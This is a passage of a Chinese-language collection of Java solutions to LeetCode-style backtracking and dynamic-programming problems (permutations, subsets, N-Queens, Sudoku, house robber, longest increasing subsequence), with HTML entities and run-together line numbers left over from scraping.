"255.255.111.35"]. 1234567891011121314151617181920212223242526272829public List&lt;String&gt; restoreIpAddresses(String s) &#123; List&lt;String&gt; addresses = new ArrayList&lt;&gt;(); StringBuilder tempAddress = new StringBuilder(); doRestore(0, tempAddress, addresses, s); return addresses;&#125;private void doRestore(int k, StringBuilder tempAddress, List&lt;String&gt; addresses, String s) &#123; if (k == 4 || s.length() == 0) &#123; if (k == 4 &amp;&amp; s.length() == 0) &#123; addresses.add(tempAddress.toString()); &#125; return; &#125; for (int i = 0; i &lt; s.length() &amp;&amp; i &lt;= 2; i++) &#123; if (i != 0 &amp;&amp; s.charAt(0) == '0') &#123; break; &#125; String part = s.substring(0, i + 1); if (Integer.valueOf(part) &lt;= 255) &#123; if (tempAddress.length() != 0) &#123; part = "." + part; &#125; tempAddress.append(part); doRestore(k + 1, tempAddress, addresses, s.substring(i + 1)); tempAddress.delete(tempAddress.length() - part.length(), tempAddress.length()); &#125; &#125;&#125; 在矩阵中寻找字符串 79. Word Search (Medium) 12345678910For example,Given board =[ ['A','B','C','E'], ['S','F','C','S'], ['A','D','E','E']]word = "ABCCED", -&gt; returns true,word = "SEE", -&gt; returns true,word = "ABCB", -&gt; returns false. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849private final static int[][] direction = &#123;&#123;1, 0&#125;, &#123;-1, 0&#125;, &#123;0, 1&#125;, &#123;0, -1&#125;&#125;;private int m;private int n;public boolean exist(char[][] board, String word) &#123; if (word == null || word.length() == 0) &#123; return true; &#125; if (board == null || board.length == 0 || board[0].length == 0) &#123; return false; &#125; m = board.length; n = board[0].length; boolean[][] hasVisited = new boolean[m][n]; for (int r = 0; r &lt; m; r++) &#123; for (int c = 0; c &lt; n; c++) &#123; if (backtracking(0, r, c, hasVisited, board, word)) &#123; return true; &#125; &#125; &#125; return false;&#125;private boolean backtracking(int curLen, int r, int c, boolean[][] visited, final char[][] board, final String word) &#123; if (curLen == word.length()) &#123; return true; &#125; if (r &lt; 0 || r &gt;= m || c &lt; 0 || c &gt;= n || board[r][c] != word.charAt(curLen) || visited[r][c]) &#123; return false; &#125; visited[r][c] = true; for (int[] d : direction) &#123; if (backtracking(curLen + 1, r + d[0], c + d[1], visited, board, word)) &#123; return true; &#125; &#125; visited[r][c] = false; return false;&#125; 输出二叉树中所有从根到叶子的路径 257. Binary Tree Paths (Easy) 12345 1 / \2 3 \ 5 1["1-&gt;2-&gt;5", "1-&gt;3"] 123456789101112131415161718192021222324252627282930313233343536373839public List&lt;String&gt; binaryTreePaths(TreeNode root) &#123; List&lt;String&gt; paths = new ArrayList&lt;&gt;(); if (root == null) &#123; return paths; &#125; List&lt;Integer&gt; values = new ArrayList&lt;&gt;(); backtracking(root, values, paths); return paths;&#125;private void backtracking(TreeNode node, List&lt;Integer&gt; values, List&lt;String&gt; paths) &#123; if (node == null) &#123; return; &#125; values.add(node.val); if (isLeaf(node)) &#123; paths.add(buildPath(values)); &#125; else &#123; backtracking(node.left, values, paths); backtracking(node.right, values, paths); &#125; values.remove(values.size() - 1);&#125;private boolean isLeaf(TreeNode node) &#123; return node.left == null &amp;&amp; node.right == null;&#125;private String buildPath(List&lt;Integer&gt; values) &#123; StringBuilder str = new StringBuilder(); for (int i = 0; i &lt; values.size(); i++) &#123; str.append(values.get(i)); if (i != values.size() - 1) &#123; str.append("-&gt;"); &#125; &#125; return str.toString();&#125; 排列 46. Permutations (Medium) 123456789[1,2,3] have the following permutations:[ [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1]] 123456789101112131415161718192021222324public List&lt;List&lt;Integer&gt;&gt; permute(int[] nums) &#123; List&lt;List&lt;Integer&gt;&gt; permutes = new ArrayList&lt;&gt;(); List&lt;Integer&gt; permuteList = new ArrayList&lt;&gt;(); boolean[] hasVisited = new boolean[nums.length]; backtracking(permuteList, permutes, hasVisited, nums); return permutes;&#125;private void backtracking(List&lt;Integer&gt; permuteList, List&lt;List&lt;Integer&gt;&gt; permutes, boolean[] visited, final int[] nums) &#123; if (permuteList.size() == nums.length) &#123; permutes.add(new ArrayList&lt;&gt;(permuteList)); // 重新构造一个 List return; &#125; for (int i = 0; i &lt; visited.length; i++) &#123; if (visited[i]) &#123; continue; &#125; visited[i] = true; permuteList.add(nums[i]); backtracking(permuteList, permutes, visited, nums); permuteList.remove(permuteList.size() - 1); visited[i] = false; &#125;&#125; 含有相同元素求排列 47. Permutations II (Medium) 12[1,1,2] have the following unique permutations:[[1,1,2], [1,2,1], [2,1,1]] 数组元素可能含有相同的元素，进行排列时就有可能出现重复的排列，要求重复的排列只返回一个。 在实现上，和 Permutations 不同的是要先排序，然后在添加一个元素时，判断这个元素是否等于前一个元素，如果等于，并且前一个元素还未访问，那么就跳过这个元素。 1234567891011121314151617181920212223242526272829public List&lt;List&lt;Integer&gt;&gt; permuteUnique(int[] nums) &#123; List&lt;List&lt;Integer&gt;&gt; permutes = new ArrayList&lt;&gt;(); List&lt;Integer&gt; permuteList = new ArrayList&lt;&gt;(); Arrays.sort(nums); // 排序 boolean[] hasVisited = new boolean[nums.length]; backtracking(permuteList, permutes, hasVisited, nums); return permutes;&#125;private void backtracking(List&lt;Integer&gt; permuteList, List&lt;List&lt;Integer&gt;&gt; permutes, boolean[] visited, final int[] nums) &#123; if (permuteList.size() == nums.length) &#123; permutes.add(new ArrayList&lt;&gt;(permuteList)); return; &#125; for (int i = 0; i &lt; visited.length; i++) &#123; if (i != 0 &amp;&amp; nums[i] == nums[i - 1] &amp;&amp; !visited[i - 1]) &#123; continue; // 防止重复 &#125; if (visited[i])&#123; continue; &#125; visited[i] = true; permuteList.add(nums[i]); backtracking(permuteList, permutes, visited, nums); permuteList.remove(permuteList.size() - 1); visited[i] = false; &#125;&#125; 组合 77. Combinations (Medium) 123456789If n = 4 and k = 2, a solution is:[ [2,4], [3,4], [2,3], [1,2], [1,3], [1,4],] 123456789101112131415161718public List&lt;List&lt;Integer&gt;&gt; combine(int n, int k) &#123; List&lt;List&lt;Integer&gt;&gt; combinations = new ArrayList&lt;&gt;(); List&lt;Integer&gt; combineList = new ArrayList&lt;&gt;(); backtracking(combineList, combinations, 1, k, n); return combinations;&#125;private void backtracking(List&lt;Integer&gt; combineList, List&lt;List&lt;Integer&gt;&gt; combinations, int start, int k, final int n) &#123; if (k == 0) &#123; combinations.add(new ArrayList&lt;&gt;(combineList)); return; &#125; for (int i = start; i &lt;= n - k + 1; i++) &#123; // 剪枝 combineList.add(i); backtracking(combineList, combinations, i + 1, k - 1, n); combineList.remove(combineList.size() - 1); &#125;&#125; 组合求和 39. Combination Sum (Medium) 123given candidate set [2, 3, 6, 7] and target 7,A solution set is:[[7],[2, 2, 3]] 123456789101112131415161718192021public List&lt;List&lt;Integer&gt;&gt; combinationSum(int[] candidates, int target) &#123; List&lt;List&lt;Integer&gt;&gt; combinations = new ArrayList&lt;&gt;(); backtracking(new ArrayList&lt;&gt;(), combinations, 0, target, candidates); return combinations;&#125;private void backtracking(List&lt;Integer&gt; tempCombination, List&lt;List&lt;Integer&gt;&gt; combinations, int start, int target, final int[] candidates) &#123; if (target == 0) &#123; combinations.add(new ArrayList&lt;&gt;(tempCombination)); return; &#125; for (int i = start; i &lt; candidates.length; i++) &#123; if (candidates[i] &lt;= target) &#123; tempCombination.add(candidates[i]); backtracking(tempCombination, combinations, i, target - candidates[i], candidates); tempCombination.remove(tempCombination.size() - 1); &#125; &#125;&#125; 含有相同元素的求组合求和 40. Combination Sum II (Medium) 12345678For example, given candidate set [10, 1, 2, 7, 6, 1, 5] and target 8,A solution set is:[ [1, 7], [1, 2, 5], [2, 6], [1, 1, 6]] 123456789101112131415161718192021222324252627public List&lt;List&lt;Integer&gt;&gt; combinationSum2(int[] candidates, int target) &#123; List&lt;List&lt;Integer&gt;&gt; combinations = new ArrayList&lt;&gt;(); Arrays.sort(candidates); backtracking(new ArrayList&lt;&gt;(), combinations, new boolean[candidates.length], 0, target, candidates); return combinations;&#125;private void backtracking(List&lt;Integer&gt; tempCombination, List&lt;List&lt;Integer&gt;&gt; combinations, boolean[] hasVisited, int start, int target, final int[] candidates) &#123; if (target == 0) &#123; combinations.add(new ArrayList&lt;&gt;(tempCombination)); return; &#125; for (int i = start; i &lt; candidates.length; i++) &#123; if (i != 0 &amp;&amp; candidates[i] == candidates[i - 1] &amp;&amp; !hasVisited[i - 1]) &#123; continue; &#125; if (candidates[i] &lt;= target) &#123; tempCombination.add(candidates[i]); hasVisited[i] = true; backtracking(tempCombination, combinations, hasVisited, i + 1, target - candidates[i], candidates); hasVisited[i] = false; tempCombination.remove(tempCombination.size() - 1); &#125; &#125;&#125; 1-9 数字的组合求和 216. Combination Sum III (Medium) 12345Input: k = 3, n = 9Output:[[1,2,6], [1,3,5], [2,3,4]] 从 1-9 数字中选出 k 个数不重复的数，使得它们的和为 n。 1234567891011121314151617181920212223public List&lt;List&lt;Integer&gt;&gt; combinationSum3(int k, int n) &#123; List&lt;List&lt;Integer&gt;&gt; combinations = new ArrayList&lt;&gt;(); List&lt;Integer&gt; path = new ArrayList&lt;&gt;(); backtracking(k, n, 1, path, combinations); return combinations;&#125;private void backtracking(int k, int n, int start, List&lt;Integer&gt; tempCombination, List&lt;List&lt;Integer&gt;&gt; combinations) &#123; if (k == 0 &amp;&amp; n == 0) &#123; combinations.add(new ArrayList&lt;&gt;(tempCombination)); return; &#125; if (k == 0 || n == 0) &#123; return; &#125; for (int i = start; i &lt;= 9; i++) &#123; tempCombination.add(i); backtracking(k - 1, n - i, i + 1, tempCombination, combinations); tempCombination.remove(tempCombination.size() - 1); &#125;&#125; 子集 78. Subsets (Medium) 找出集合的所有子集，子集不能重复，[1, 2] 和 [2, 1] 这种子集算重复 12345678910111213141516171819202122public List&lt;List&lt;Integer&gt;&gt; subsets(int[] nums) &#123; List&lt;List&lt;Integer&gt;&gt; subsets = new ArrayList&lt;&gt;(); List&lt;Integer&gt; tempSubset = new ArrayList&lt;&gt;(); for (int size = 0; size &lt;= nums.length; size++) &#123; backtracking(0, tempSubset, subsets, size, nums); // 不同的子集大小 &#125; return subsets;&#125;private void backtracking(int start, List&lt;Integer&gt; tempSubset, List&lt;List&lt;Integer&gt;&gt; subsets, final int size, final int[] nums) &#123; if (tempSubset.size() == size) &#123; subsets.add(new ArrayList&lt;&gt;(tempSubset)); return; &#125; for (int i = start; i &lt; nums.length; i++) &#123; tempSubset.add(nums[i]); backtracking(i + 1, tempSubset, subsets, size, nums); tempSubset.remove(tempSubset.size() - 1); &#125;&#125; 含有相同元素求子集 90. Subsets II (Medium) 1234567891011For example,If nums = [1,2,2], a solution is:[ [2], [1], [1,2,2], [2,2], [1,2], []] 1234567891011121314151617181920212223242526272829public List&lt;List&lt;Integer&gt;&gt; subsetsWithDup(int[] nums) &#123; Arrays.sort(nums); List&lt;List&lt;Integer&gt;&gt; subsets = new ArrayList&lt;&gt;(); List&lt;Integer&gt; tempSubset = new ArrayList&lt;&gt;(); boolean[] hasVisited = new boolean[nums.length]; for (int size = 0; size &lt;= nums.length; size++) &#123; backtracking(0, tempSubset, subsets, hasVisited, size, nums); // 不同的子集大小 &#125; return subsets;&#125;private void backtracking(int start, List&lt;Integer&gt; tempSubset, List&lt;List&lt;Integer&gt;&gt; subsets, boolean[] hasVisited, final int size, final int[] nums) &#123; if (tempSubset.size() == size) &#123; subsets.add(new ArrayList&lt;&gt;(tempSubset)); return; &#125; for (int i = start; i &lt; nums.length; i++) &#123; if (i != 0 &amp;&amp; nums[i] == nums[i - 1] &amp;&amp; !hasVisited[i - 1]) &#123; continue; &#125; tempSubset.add(nums[i]); hasVisited[i] = true; backtracking(i + 1, tempSubset, subsets, hasVisited, size, nums); hasVisited[i] = false; tempSubset.remove(tempSubset.size() - 1); &#125;&#125; 分割字符串使得每个部分都是回文数 131. Palindrome Partitioning (Medium) 1234567For example, given s = "aab",Return[ ["aa","b"], ["a","a","b"]] 1234567891011121314151617181920212223242526272829public List&lt;List&lt;String&gt;&gt; partition(String s) &#123; List&lt;List&lt;String&gt;&gt; partitions = new ArrayList&lt;&gt;(); List&lt;String&gt; tempPartition = new ArrayList&lt;&gt;(); doPartition(s, partitions, tempPartition); return partitions;&#125;private void doPartition(String s, List&lt;List&lt;String&gt;&gt; partitions, List&lt;String&gt; tempPartition) &#123; if (s.length() == 0) &#123; partitions.add(new ArrayList&lt;&gt;(tempPartition)); return; &#125; for (int i = 0; i &lt; s.length(); i++) &#123; if (isPalindrome(s, 0, i)) &#123; tempPartition.add(s.substring(0, i + 1)); doPartition(s.substring(i + 1), partitions, tempPartition); tempPartition.remove(tempPartition.size() - 1); &#125; &#125;&#125;private boolean isPalindrome(String s, int begin, int end) &#123; while (begin &lt; end) &#123; if (s.charAt(begin++) != s.charAt(end--)) &#123; return false; &#125; &#125; return true;&#125; 数独 37. Sudoku Solver (Hard) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253private boolean[][] rowsUsed = new boolean[9][10];private boolean[][] colsUsed = new boolean[9][10];private boolean[][] cubesUsed = new boolean[9][10];private char[][] board;public void solveSudoku(char[][] board) &#123; this.board = board; for (int i = 0; i &lt; 9; i++) for (int j = 0; j &lt; 9; j++) &#123; if (board[i][j] == '.') &#123; continue; &#125; int num = board[i][j] - '0'; rowsUsed[i][num] = true; colsUsed[j][num] = true; cubesUsed[cubeNum(i, j)][num] = true; &#125; for (int i = 0; i &lt; 9; i++) &#123; for (int j = 0; j &lt; 9; j++) &#123; backtracking(i, j); &#125; &#125;&#125;private boolean backtracking(int row, int col) &#123; while (row &lt; 9 &amp;&amp; board[row][col] != '.') &#123; row = col == 8 ? row + 1 : row; col = col == 8 ? 0 : col + 1; &#125; if (row == 9) &#123; return true; &#125; for (int num = 1; num &lt;= 9; num++) &#123; if (rowsUsed[row][num] || colsUsed[col][num] || cubesUsed[cubeNum(row, col)][num]) &#123; continue; &#125; rowsUsed[row][num] = colsUsed[col][num] = cubesUsed[cubeNum(row, col)][num] = true; board[row][col] = (char) (num + '0'); if (backtracking(row, col)) &#123; return true; &#125; board[row][col] = '.'; rowsUsed[row][num] = colsUsed[col][num] = cubesUsed[cubeNum(row, col)][num] = false; &#125; return false;&#125;private int cubeNum(int i, int j) &#123; int r = i / 3; int c = j / 3; return r * 3 + c;&#125; N 皇后 51. N-Queens (Hard) 在 n*n 的矩阵中摆放 n 个皇后，并且每个皇后不能在同一行，同一列，同一对角线上，求所有的 n 皇后的解。 一行一行地摆放，在确定一行中的那个皇后应该摆在哪一列时，需要用三个标记数组来确定某一列是否合法，这三个标记数组分别为：列标记数组、45 度对角线标记数组和 135 度对角线标记数组。 45 度对角线标记数组的维度为 2 * n - 1，通过下图可以明确 (r, c) 的位置所在的数组下标为 r + c。 135 度对角线标记数组的维度也是 2 * n - 1，(r, c) 的位置所在的数组下标为 n - 1 - (r - c)。 1234567891011121314151617181920212223242526272829303132333435363738394041424344private List&lt;List&lt;String&gt;&gt; solutions;private char[][] nQueens;private boolean[] colUsed;private boolean[] diagonals45Used;private boolean[] diagonals135Used;private int n;public List&lt;List&lt;String&gt;&gt; solveNQueens(int n) &#123; solutions = new ArrayList&lt;&gt;(); nQueens = new char[n][n]; for (int i = 0; i &lt; n; i++) &#123; Arrays.fill(nQueens[i], '.'); &#125; colUsed = new boolean[n]; diagonals45Used = new boolean[2 * n - 1]; diagonals135Used = new boolean[2 * n - 1]; this.n = n; backtracking(0); return solutions;&#125;private void backtracking(int row) &#123; if (row == n) &#123; List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (char[] chars : nQueens) &#123; list.add(new String(chars)); &#125; solutions.add(list); return; &#125; for (int col = 0; col &lt; n; col++) &#123; int diagonals45Idx = row + col; int diagonals135Idx = n - 1 - (row - col); if (colUsed[col] || diagonals45Used[diagonals45Idx] || diagonals135Used[diagonals135Idx]) &#123; continue; &#125; nQueens[row][col] = 'Q'; colUsed[col] = diagonals45Used[diagonals45Idx] = diagonals135Used[diagonals135Idx] = true; backtracking(row + 1); colUsed[col] = diagonals45Used[diagonals45Idx] = diagonals135Used[diagonals135Idx] = false; nQueens[row][col] = '.'; &#125;&#125; 分治给表达式加括号 241. Different Ways to Add Parentheses (Medium) 123456Input: "2-1-1".((2-1)-1) = 0(2-(1-1)) = 2Output : [0, 2] 1234567891011121314151617181920212223242526272829public List&lt;Integer&gt; diffWaysToCompute(String input) &#123; List&lt;Integer&gt; ways = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; input.length(); i++) &#123; char c = input.charAt(i); if (c == '+' || c == '-' || c == '*') &#123; List&lt;Integer&gt; left = diffWaysToCompute(input.substring(0, i)); List&lt;Integer&gt; right = diffWaysToCompute(input.substring(i + 1)); for (int l : left) &#123; for (int r : right) &#123; switch (c) &#123; case '+': ways.add(l + r); break; case '-': ways.add(l - r); break; case '*': ways.add(l * r); break; &#125; &#125; &#125; &#125; &#125; if (ways.size() == 0) &#123; ways.add(Integer.valueOf(input)); &#125; return ways;&#125; 动态规划递归和动态规划都是将原问题拆成多个子问题然后求解，他们之间最本质的区别是，动态规划保存了子问题的解，避免重复计算。 斐波那契数列爬楼梯 70. Climbing Stairs (Easy) 题目描述：有 N 阶楼梯，每次可以上一阶或者两阶，求有多少种上楼梯的方法。 定义一个数组 dp 存储上楼梯的方法数（为了方便讨论，数组下标从 1 开始），dp[i] 表示走到第 i 个楼梯的方法数目。第 i 个楼梯可以从第 i-1 和 i-2 个楼梯再走一步到达，走到第 i 个楼梯的方法数为走到第 i-1 和第 i-2 个楼梯的方法数之和。 dp[N] 即为所求。 考虑到 dp[i] 只与 dp[i - 1] 和 dp[i - 2] 有关，因此可以只用两个变量来存储 dp[i - 1] 和 dp[i - 2]，使得原来的 O(N) 空间复杂度优化为 O(1) 复杂度。 123456789101112public int climbStairs(int n) &#123; if (n &lt;= 2) &#123; return n; &#125; int pre2 = 1, pre1 = 2; for (int i = 2; i &lt; n; i++) &#123; int cur = pre1 + pre2; pre2 = pre1; pre1 = cur; &#125; return pre1;&#125; 强盗抢劫 198. House Robber (Easy) 题目描述：抢劫一排住户，但是不能抢邻近的住户，求最大抢劫量。 定义 dp 数组用来存储最大的抢劫量，其中 dp[i] 表示抢到第 i 个住户时的最大抢劫量。由于不能抢劫邻近住户，因此如果抢劫了第 i 个住户那么只能抢劫 i - 2 或者 i - 3 的住户，所以 1234567891011121314151617public int rob(int[] nums) &#123; int n = nums.length; if (n == 0) &#123; return 0; &#125; if (n == 1) &#123; return nums[0]; &#125; int pre3 = 0, pre2 = 0, pre1 = 0; for (int i = 0; i &lt; n; i++) &#123; int cur = Math.max(pre2, pre3) + nums[i]; pre3 = pre2; pre2 = pre1; pre1 = cur; &#125; return Math.max(pre1, pre2);&#125; 强盗在环形街区抢劫 213. House Robber II (Medium) 123456789101112131415161718192021public int rob(int[] nums) &#123; if (nums == null || nums.length == 0) &#123; return 0; &#125; int n = nums.length; if (n == 1) &#123; return nums[0]; &#125; return Math.max(rob(nums, 0, n - 2), rob(nums, 1, n - 1));&#125;private int rob(int[] nums, int first, int last) &#123; int pre3 = 0, pre2 = 0, pre1 = 0; for (int i = first; i &lt;= last; i++) &#123; int cur = Math.max(pre3, pre2) + nums[i]; pre3 = pre2; pre2 = pre1; pre1 = cur; &#125; return Math.max(pre2, pre1);&#125; 母牛生产 程序员代码面试指南-P181 题目描述：假设农场中成熟的母牛每年都会生 1 头小母牛，并且永远不会死。第一年有 1 只小母牛，从第二年开始，母牛开始生小母牛。每只小母牛 3 年之后成熟又可以生小母牛。给定整数 N，求 N 年后牛的数量。 第 i 年成熟的牛的数量为： 信件错排 题目描述：有 N 个 信 和 信封，它们被打乱，求错误装信方式的数量。 定义一个数组 dp 存储错误方式数量，dp[i] 表示前 i 个信和信封的错误方式数量。假设第 i 个信装到第 j 个信封里面，而第 j 个信装到第 k 个信封里面。根据 i 和 k 是否相等，有两种情况： i==k，交换 i 和 k 的信后，它们的信和信封在正确的位置，但是其余 i-2 封信有 dp[i-2] 种错误装信的方式。由于 j 有 i-1 种取值，因此共有 (i-1)*dp[i-2] 种错误装信方式。 i != k，交换 i 和 j 的信后，第 i 个信和信封在正确的位置，其余 i-1 封信有 dp[i-1] 种错误装信方式。由于 j 有 i-1 种取值，因此共有 (i-1)*dp[i-1] 种错误装信方式。 综上所述，错误装信数量方式数量为： dp[N] 即为所求。 矩阵路径矩阵的最小路径和 64. Minimum Path Sum (Medium) 1234[[1,3,1], [1,5,1], [4,2,1]]Given the above grid map, return 7. Because the path 1→3→1→1→1 minimizes the sum. 题目描述：求从矩阵的左上角到右下角的最小路径和，每次只能向右和向下移动。 1234567891011121314151617181920public int minPathSum(int[][] grid) &#123; if (grid.length == 0 || grid[0].length == 0) &#123; return 0; &#125; int m = grid.length, n = grid[0].length; int[] dp = new int[n]; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (j == 0) &#123; dp[j] = dp[j]; // 只能从上侧走到该位置 &#125; else if (i == 0) &#123; dp[j] = dp[j - 1]; // 只能从左侧走到该位置 &#125; else &#123; dp[j] = Math.min(dp[j - 1], dp[j]); &#125; dp[j] += grid[i][j]; &#125; &#125; return dp[n - 1];&#125; 矩阵的总路径数 62. Unique Paths (Medium) 题目描述：统计从矩阵左上角到右下角的路径总数，每次只能向右或者向下移动。 12345678910public int uniquePaths(int m, int n) &#123; int[] dp = new int[n]; Arrays.fill(dp, 1); for (int i = 1; i &lt; m; i++) &#123; for (int j = 1; j &lt; n; j++) &#123; dp[j] = dp[j] + dp[j - 1]; &#125; &#125; return dp[n - 1];&#125; 也可以直接用数学公式求解，这是一个组合问题。机器人总共移动的次数 S=m+n-2，向下移动的次数 D=m-1，那么问题可以看成从 S 从取出 D 个位置的组合数量，这个问题的解为 C(S, D)。 123456789public int uniquePaths(int m, int n) &#123; int S = m + n - 2; // 总共的移动次数 int D = m - 1; // 向下的移动次数 long ret = 1; for (int i = 1; i &lt;= D; i++) &#123; ret = ret * (S - D + i) / i; &#125; return (int) ret;&#125; 数组区间数组区间和 303. Range Sum Query - Immutable (Easy) 12345Given nums = [-2, 0, 3, -5, 2, -1]sumRange(0, 2) -&gt; 1sumRange(2, 5) -&gt; -1sumRange(0, 5) -&gt; -3 求区间 i \ j 的和，可以转换为 sum[j] - sum[i-1]，其中 sum[i] 为 0 \ i 的和。 1234567891011121314class NumArray &#123; private int[] sums; public NumArray(int[] nums) &#123; sums = new int[nums.length]; for (int i = 0; i &lt; nums.length; i++) &#123; sums[i] = i == 0 ? nums[0] : sums[i - 1] + nums[i]; &#125; &#125; public int sumRange(int i, int j) &#123; return i == 0 ? sums[j] : sums[j] - sums[i - 1]; &#125;&#125; 子数组最大的和 53. Maximum Subarray (Easy) 12For example, given the array [-2,1,-3,4,-1,2,1,-5,4],the contiguous subarray [4,-1,2,1] has the largest sum = 6. 123456789101112public int maxSubArray(int[] nums) &#123; if (nums == null || nums.length == 0) &#123; return 0; &#125; int preSum = nums[0]; int maxSum = preSum; for (int i = 1; i &lt; nums.length; i++) &#123; preSum = preSum &gt; 0 ? preSum + nums[i] : nums[i]; maxSum = Math.max(maxSum, preSum); &#125; return maxSum;&#125; 数组中等差递增子区间的个数 413. Arithmetic Slices (Medium) 12A = [1, 2, 3, 4]return: 3, for 3 arithmetic slices in A: [1, 2, 3], [2, 3, 4] and [1, 2, 3, 4] itself. dp[i] 表示以 A[i] 为结尾的等差递增子区间的个数。 如果 A[i] - A[i - 1] == A[i - 1] - A[i - 2]，表示 [A[i - 2], A[i - 1], A[i]] 是一个等差递增子区间。如果 [A[i - 3], A[i - 2], A[i - 1]] 是一个等差递增子区间，那么 [A[i - 3], A[i - 2], A[i - 1], A[i]] 也是。因此在这个条件下，dp[i] = dp[i-1] + 1。 1234567891011121314151617public int numberOfArithmeticSlices(int[] A) &#123; if (A == null || A.length == 0) &#123; return 0; &#125; int n = A.length; int[] dp = new int[n]; for (int i = 2; i &lt; n; i++) &#123; if (A[i] - A[i - 1] == A[i - 1] - A[i - 2]) &#123; dp[i] = dp[i - 1] + 1; &#125; &#125; int total = 0; for (int cnt : dp) &#123; total += cnt; &#125; return total;&#125; 分割整数分割整数的最大乘积 343. Integer Break (Medim) 题目描述：For example, given n = 2, return 1 (2 = 1 + 1); given n = 10, return 36 (10 = 3 + 3 + 4). 12345678910public int integerBreak(int n) &#123; int[] dp = new int[n + 1]; dp[1] = 1; for (int i = 2; i &lt;= n; i++) &#123; for (int j = 1; j &lt;= i - 1; j++) &#123; dp[i] = Math.max(dp[i], Math.max(j * dp[i - j], j * (i - j))); &#125; &#125; return dp[n];&#125; 按平方数来分割整数 279. Perfect Squares(Medium) 题目描述：For example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9. 123456789101112131415161718192021222324252627public int numSquares(int n) &#123; List&lt;Integer&gt; squareList = generateSquareList(n); int[] dp = new int[n + 1]; for (int i = 1; i &lt;= n; i++) &#123; int min = Integer.MAX_VALUE; for (int square : squareList) &#123; if (square &gt; i) &#123; break; &#125; min = Math.min(min, dp[i - square] + 1); &#125; dp[i] = min; &#125; return dp[n];&#125;private List&lt;Integer&gt; generateSquareList(int n) &#123; List&lt;Integer&gt; squareList = new ArrayList&lt;&gt;(); int diff = 3; int square = 1; while (square &lt;= n) &#123; squareList.add(square); square += diff; diff += 2; &#125; return squareList;&#125; 分割整数构成字母字符串 91. Decode Ways (Medium) 题目描述：Given encoded message “12”, it could be decoded as “AB” (1 2) or “L” (12). 1234567891011121314151617181920212223public int numDecodings(String s) &#123; if (s == null || s.length() == 0) &#123; return 0; &#125; int n = s.length(); int[] dp = new int[n + 1]; dp[0] = 1; dp[1] = s.charAt(0) == '0' ? 0 : 1; for (int i = 2; i &lt;= n; i++) &#123; int one = Integer.valueOf(s.substring(i - 1, i)); if (one != 0) &#123; dp[i] += dp[i - 1]; &#125; if (s.charAt(i - 2) == '0') &#123; continue; &#125; int two = Integer.valueOf(s.substring(i - 2, i)); if (two &lt;= 26) &#123; dp[i] += dp[i - 2]; &#125; &#125; return dp[n];&#125; 最长递增子序列已知一个序列 {S1, S2,…,Sn} ，取出若干数组成新的序列 {Si1, Si2,…, Sim}，其中 i1、i2 … im 保持递增，即新序列中各个数仍然保持原数列中的先后顺序，称新序列为原序列的一个 子序列 。 如果在子序列中，当下标 ix &gt; iy 时，Six &gt; Siy，称子序列为原序列的一个 递增子序列 。 定义一个数组 dp 存储最长递增子序列的长度，dp[n] 表示以 Sn 结尾的序列的最长递增子序列长度。对于一个递增子序列 {Si1, Si2,…,Sim}，如果 im &lt; n 并且 Sim &lt; Sn ，此时 {Si1, Si2,…, Sim, Sn} 为一个递增子序列，递增子序列的长度增加 1。满足上述条件的递增子序列中，长度最长的那个递增子序列就是要找的，在长度最长的递增子序列上加上 Sn 就构成了以 Sn 为结尾的最长递增子序列。因此 dp[n] = max{ dp[i]+1 | Si &lt; Sn &amp;&amp; i &lt; n} 。 因为在求 dp[n] 时可能无法找到一个满足条件的递增子序列，此时 {Sn} 就构成了递增子序列，需要对前面的求解方程做修改，令 dp[n] 最小为 1，即： 对于一个长度为 N 的序列，最长递增子序列并不一定会以 SN 为结尾，因此 dp[N] 不是序列的最长递增子序列的长度，需要遍历 dp 数组找出最大值才是所要的结果，即 max{ dp[i] | 1 &lt;= i &lt;= N} 即为所求。 最长递增子序列 300. Longest Increasing Subsequence (Medium) 1234567891011121314public int lengthOfLIS(int[] nums) &#123; int n = nums.length; int[] dp = new int[n]; for (int i = 0; i &lt; n; i++) &#123; int max = 1; for (int j = 0; j &lt; i; j++) &#123; if (nums[i] &gt; nums[j]) &#123; max = Math.max(max, dp[j] + 1); &#125; &#125; dp[i] = max; &#125; return Arrays.stream(dp).max().orElse(0);&#125; 使用 Stream 求最大值会导致运行时间过长，可以改成以下形式： 12345int ret = 0;for (int i = 0; i &lt; n; i++) &#123; ret = Math.max(ret, dp[i]);&#125;return ret; 以上解法的时间复杂度为 O(N2) ，可以使用二分查找将时间复杂度降低为 O(NlogN)。 定义一个 tails 数组，其中 tails[i] 存储长度为 i + 1 的最长递增子序列的最后一个元素。对于一个元素 x， 如果它大于 tails 数组所有的值，那么把它添加到 tails 后面，表示最长递增子序列长度加 1； 如果 tails[i-1] &lt; x &lt;= tails[i]，那么更新 tails[i-1] = x。 例如对于数组 [4,3,6,5]，有： 123456tails len num[] 0 4[4] 1 3[3] 1 6[3,6] 2 5[3,5] 2 null 可以看出 tails 数组保持有序，因此在查找 Si 位于 tails 数组的位置时就可以使用二分查找。 12345678910111213141516171819202122232425262728public int lengthOfLIS(int[] nums) &#123; int n = nums.length; int[] tails = new int[n]; int len = 0; for (int num : nums) &#123; int index = binarySearch(tails, len, num); tails[index] = num; if (index == len) &#123; len++; &#125; &#125; return len;&#125;private int binarySearch(int[] tails, int len, int key) &#123; int l = 0, h = len; while (l &lt; h) &#123; int mid = l + (h - l) / 2; if (tails[mid] == key) &#123; return mid; &#125; else if (tails[mid] &gt; key) &#123; h = mid; &#125; else &#123; l = mid + 1; &#125; &#125; return l;&#125; 一组整数对能够构成的最长链 646. Maximum Length of Pair Chain (Medium) 123Input: [[1,2], [2,3], [3,4]]Output: 2Explanation: The longest chain is [1,2] -&gt; [3,4] 题目描述：对于 (a, b) 和 (c, d) ，如果 b &lt; c，则它们可以构成一条链。 1234567891011121314151617public int findLongestChain(int[][] pairs) &#123; if (pairs == null || pairs.length == 0) &#123; return 0; &#125; Arrays.sort(pairs, (a, b) -&gt; (a[0] - b[0])); int n = pairs.length; int[] dp = new int[n]; Arrays.fill(dp, 1); for (int i = 1; i &lt; n; i++) &#123; for (int j = 0; j &lt; i; j++) &#123; if (pairs[j][1] &lt; 